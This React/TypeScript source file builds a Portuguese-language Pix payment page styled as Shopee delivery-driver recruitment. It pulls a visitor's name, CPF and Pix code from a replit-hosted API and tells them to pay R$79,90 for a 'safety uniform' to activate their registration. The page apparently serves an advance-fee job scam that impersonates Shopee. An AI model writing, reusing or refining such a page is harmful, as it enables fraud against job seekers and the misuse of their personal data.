import React, { useEffect, useState, useCallback } from 'react';
import { Helmet } from 'react-helmet';
import { useLocation } from 'wouter';

interface Cliente {
  id: number;
  nome: string;
  cpf: string;
  telefone: string;
  email: string;
  pixCode: string;
  cep: string | null;
  rua: string | null;
  numero: string | null;
  complemento: string | null;
  bairro: string | null;
  cidade: string | null;
  estado: string | null;
  data_cadastro: string;
}

interface ApiResponse {
  sucesso: boolean;
  cliente: Cliente;
}

const Pay: React.FC = () => {
  const [location] = useLocation();
  const [loading, setLoading] = useState(true);
  const [cliente, setCliente] = useState<Cliente | null>(null);
  const [error, setError] = useState<string | null>(null);
  
  // Referência para o input do código PIX
  const [pixCode, setPixCode] = useState<string>('000201010212268500...');

  // Função para copiar o código PIX
  // Estado para controlar a animação de feedback do botão de cópia
  const [copiedFeedback, setCopiedFeedback] = useState(false);

  const copyPixCode = useCallback(() => {
    const codeToCopy = cliente?.pixCode || pixCode;
    if (codeToCopy) {
      // Garantir que todo o código seja copiado, mesmo que seja longo
      navigator.clipboard.writeText(codeToCopy)
        .then(() => {
          // Em vez de um alert, mostramos um feedback visual
          setCopiedFeedback(true);
          console.log('Código PIX completo copiado:', codeToCopy);
          
          // Resetar o feedback após 2 segundos
          setTimeout(() => {
            setCopiedFeedback(false);
          }, 2000);
        })
        .catch(err => {
          console.error('Erro ao copiar código PIX:', err);
          alert('Erro ao copiar código. Tente selecionar o código manualmente.');
        });
    }
  }, [cliente, pixCode]);

  // Efeito para buscar os dados do cliente
  useEffect(() => {
    const queryParams = new URLSearchParams(window.location.search);
    const cpfParam = queryParams.get('cpf');
    
    if (cpfParam) {
      // Remover qualquer formatação do CPF (pontos, traços)
      const cpfLimpo = cpfParam.replace(/\D/g, '');
      
      setLoading(true);
      
      // Buscar dados do cliente na API
      fetch(`https://webhook-manager.replit.app/api/v1/cliente?cpf=${cpfLimpo}`)
        .then(response => {
          if (!response.ok) {
            throw new Error('Erro ao buscar dados do cliente');
          }
          return response.json();
        })
        .then((data: ApiResponse) => {
          if (data.sucesso && data.cliente) {
            setCliente(data.cliente);
            setPixCode(data.cliente.pixCode || '000201010212268500...');
          } else {
            setError('Cliente não encontrado');
          }
        })
        .catch(err => {
          console.error('Erro ao buscar cliente:', err);
          setError('Erro ao buscar dados do cliente');
        })
        .finally(() => {
          setLoading(false);
        });
    } else {
      setLoading(false);
    }
  }, [location]);

  // Adicionar os estilos diretamente no componente
  useEffect(() => {
    // Adicionar as fontes e estilos externos
    const fontAwesome = document.createElement('link');
    fontAwesome.rel = 'stylesheet';
    fontAwesome.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css';
    document.head.appendChild(fontAwesome);

    const robotoFont = document.createElement('link');
    robotoFont.rel = 'stylesheet';
    robotoFont.href = 'https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap';
    document.head.appendChild(robotoFont);

    // Limpar ao desmontar o componente
    return () => {
      document.head.removeChild(fontAwesome);
      document.head.removeChild(robotoFont);
    };
  }, []);

  return (
    <div className="font-['Roboto',sans-serif] bg-[#F5F5F5] text-sm min-h-screen">
      <Helmet>
        <title>Pagamento</title>
        <style>
          {`
            body {
                font-family: 'Roboto', sans-serif;
                background-color: #F5F5F5;
                margin: 0;
                padding: 0;
            }
            input::placeholder {
                color: #969696;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            .spinner {
                width: 20px;
                height: 20px;
                border: 2px solid #FFECE6;
                border-top: 2px solid #EF4444;
                border-radius: 50%;
                animation: spin 1s linear infinite;
            }
          `}
        </style>
      </Helmet>

      <header className="bg-white py-2 px-4 flex items-center rounded-b-sm">
        <a href="#" className="text-[#EF4444] text-xl"></a>
        <div className="flex-grow flex items-center justify-center">
          <div className="spinner mr-2"></div>
          <h1 className="text-lg font-normal text-center text-[#10172A]">Aguardando pagamento...</h1>
        </div>
      </header>

      <div className="w-full bg-white mt-2 rounded-sm">
        <div className="p-3">
          <div className="flex items-start mb-4">
            <img src="https://i.ibb.co/Q7RXTRzN/a0e45d2fcc7fdab21ea74890cbd0d45e-2-1.png" alt="Uniforme de Segurança" className="w-[100px] bg-[#F5F5F5] rounded-[4px]" />
            <div className="ml-4 flex flex-col justify-start">
              <p className="text-[#212121] font-bold">Entregador Shopee</p>
              <p className="text-[#212121]"><strong>Nome:</strong> {cliente ? cliente.nome : 'João da Silva'}</p>
              <p className="text-[#212121]"><strong>CPF:</strong> {cliente ? cliente.cpf : '123.456.789-00'}</p>
            </div>
          </div>

          <hr className="w-full border-t border-gray-200 my-4" />

          <div className="flex items-center justify-center mb-4">
            <img src="https://img.icons8.com/color/512/pix.png" alt="Pix logo" className="w-6 h-6 mr-2" />
            <span className="text-[#212121]">Pix</span>
          </div>

          <div className="bg-[#FFF3CD] border border-[#FFEEBA] rounded-sm p-3 mb-4 text-center">
            <p className="text-[#856404]">Realize o pagamento de <strong>R$79,90</strong> para receber o Uniforme de Segurança e ativar seu cadastro.</p>
          </div>

          <div className="mb-4">
            <p className="text-[#212121] text-center mb-1">Código Pix</p>
            <div className="flex justify-center">
              <div className="w-full bg-[#F5F5F5] border border-[#E0E0E0] rounded mx-1">
                <textarea 
                  value={cliente ? cliente.pixCode : pixCode} 
                  className="w-full h-[60px] text-[#737373] bg-transparent focus:outline-none text-left text-xs px-2 py-1 cursor-pointer resize-none overflow-auto" 
                  readOnly 
                  onClick={copyPixCode}
                />
              </div>
            </div>
            {copiedFeedback && (
              <p className="text-green-600 text-center text-xs mt-1">
                <span className="bg-green-100 px-2 py-1 rounded inline-flex items-center">
                  <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <polyline points="20 6 9 17 4 12"></polyline>
                  </svg>
                  <span className="ml-1">Código completo copiado com sucesso!</span>
                </span>
              </p>
            )}
          </div>

          <button 
            className={`w-full py-2 rounded-sm transition-all duration-200 flex items-center justify-center ${
              copiedFeedback 
                ? "bg-green-600 hover:bg-green-700" 
                : "bg-[#EF4444] hover:bg-[#D91C1C]"
            } text-white`}
            onClick={copyPixCode}
          >
            {copiedFeedback ? (
              <>
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="mr-1">
                  <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
                Código PIX Copiado
              </>
            ) : (
              <>
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="mr-1">
                  <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                  <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                </svg>
                Copiar Código PIX Completo
              </>
            )}
          </button>
        </div>
      </div>

      <div className="w-full bg-white mt-2 rounded-sm">
        <div className="p-3">
          <p className="text-[#212121] font-medium mb-4 pb-2 border-b border-[#E0E0E0]">Por favor siga as instruções</p>

          <div className="flex mb-2">
            <div className="w-5 flex-shrink-0">
              <div className="w-5 h-5 rounded-full bg-[#CCCCCC] flex items-center justify-center text-white text-xs">1</div>
            </div>
            <p className="text-[#737373] ml-2">Copie o código Pix acima.</p>
          </div>

          <div className="flex mb-2">
            <div className="w-5 flex-shrink-0">
              <div className="w-5 h-5 rounded-full bg-[#CCCCCC] flex items-center justify-center text-white text-xs">2</div>
            </div>
            <p className="text-[#737373] ml-2">Acesse o app do seu banco ou internet banking de preferência.</p>
          </div>

          <div className="flex mb-2">
            <div className="w-5 flex-shrink-0">
              <div className="w-5 h-5 rounded-full bg-[#CCCCCC] flex items-center justify-center text-white text-xs">3</div>
            </div>
            <p className="text-[#737373] ml-2">Escolha pagar com o Pix, cole o código e finalize o pagamento.</p>
          </div>

          <div className="flex mb-2">
            <div className="w-5 flex-shrink-0">
              <div className="w-5 h-5 rounded-full bg-[#CCCCCC] flex items-center justify-center text-white text-xs">4</div>
            </div>
            <p className="text-[#737373] ml-2">Seu pagamento será aprovado em alguns segundos.</p>
          </div>
        </div>
      </div>

      <div className="p-3 mt-2">
        {error && (
          <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded">
            <p className="text-center">{error}</p>
          </div>
        )}
      </div>
    </div>
  );
};

export default Pay;